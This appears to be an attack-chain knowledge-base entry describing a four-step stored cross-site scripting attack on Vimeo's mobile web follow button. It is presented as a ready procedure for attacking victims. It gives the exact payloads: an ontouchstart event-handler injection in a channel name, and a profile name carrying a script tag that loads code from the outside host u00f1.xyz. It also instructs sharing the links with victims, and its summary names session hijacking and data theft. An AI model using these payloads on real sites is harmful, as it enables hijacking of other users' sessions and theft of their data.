---
id: ac-vimeo-xss-mobile-88088
tags:
  - xss
  - vimeo
  - mobile
  - javascript
  - injection
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-Channel-Name-for-XSS]]'
  - '[[procedures/Trigger-XSS-on-Channel-Follow-Button]]'
  - '[[procedures/Create-Malicious-Profile-Name-for-XSS]]'
  - '[[procedures/Trigger-XSS-on-Profile-Page]]'
step_count: 4
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:40.045Z'
description: >-
  Multi-stage XSS attack exploiting unescaped user and channel names in Vimeo's
  mobile web interface to inject and execute JavaScript via the '+ Follow'
  button.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# XSS via Malicious Channel and Profile Names in Vimeo Mobile Follow Button

Multi-stage attack chain demonstrating a complete XSS workflow on Vimeo's mobile web version, where unescaped user or channel names allow HTML and JavaScript injection into the '+ Follow' button attributes, leading to arbitrary code execution in victims' browsers.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious Channel] --> B[Trigger Channel XSS]
    A --> C[Create Malicious Profile]
    C --> D[Trigger Profile XSS]
    B --> E[JavaScript Execution]
    D --> E

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#e74c3c
    style D fill:#f39c12
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (desktop for setup, mobile for exploitation)

### Target Environment

- Vimeo.com web application
- Mobile web version (e.g., via mobile browser or device emulation)
- Attacker account on Vimeo with ability to create channels and edit profiles

### Initial Access Requirements

- Valid Vimeo user account
- Access to desktop and mobile browsers
- No special privileges beyond standard user

## Detailed Attack Procedures

### Step 1: Create Malicious Channel
procedure: [[procedures/Create-Malicious-Channel-Name-for-XSS]]

**Objective**: Inject a payload into a channel name to enable XSS when rendered in the mobile '+ Follow' button.

**Instructions**: Log in to Vimeo on desktop, navigate to your channels page, and create a new channel with the payload '" ontouchstart="alert(document.domain)"' as the name.

**Expected Output**: New channel created with the malicious name embedded.

**Success Indicators**:
- Channel URL saved (e.g., https://vimeo.com/channels/963609)
- Payload visible in channel settings

### Step 2: Trigger XSS on Channel Follow Button
procedure: [[procedures/Trigger-XSS-on-Channel-Follow-Button]]

**Objective**: Execute the injected JavaScript by interacting with the vulnerable button on a victim's mobile device.

**Instructions**: Share the channel URL with a victim or access it yourself on mobile web. Touch the '+ Follow' button to fire the ontouchstart event.

**Expected Output**: Alert box displaying the document domain, confirming JavaScript execution.

**Success Indicators**:
- Alert triggered on button touch
- No errors in browser console related to injection

### Step 3: Create Malicious Profile
procedure: [[procedures/Create-Malicious-Profile-Name-for-XSS]]

**Objective**: Inject a payload into the user profile name for automatic XSS execution on profile page load.

**Instructions**: On desktop Vimeo, go to settings, set your name to '"><script src=//u00f1.xyz>', and save changes.

**Expected Output**: Profile updated with the injected script tag.

**Success Indicators**:
- Profile URL reflects the change (e.g., https://vimeo.com/user36690798)
- Name displays the payload in settings

### Step 4: Trigger XSS on Profile Page
procedure: [[procedures/Trigger-XSS-on-Profile-Page]]

**Objective**: Achieve automatic JavaScript execution when a victim loads the profile page on mobile.

**Instructions**: Share the profile URL with a victim or access it on mobile web; the script loads and executes on page render.

**Expected Output**: External script from //u00f1.xyz executes, potentially displaying an alert or performing other actions.

**Success Indicators**:
- Script executes without user interaction
- Network request to u00f1.xyz visible in dev tools

## Attack Chain Summary

### Key Achievements

1. Successful injection of event handler in channel names for interaction-based XSS
2. Automatic script injection via profile names for drive-by execution
3. Arbitrary JavaScript execution in victim browsers, enabling session hijacking or data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
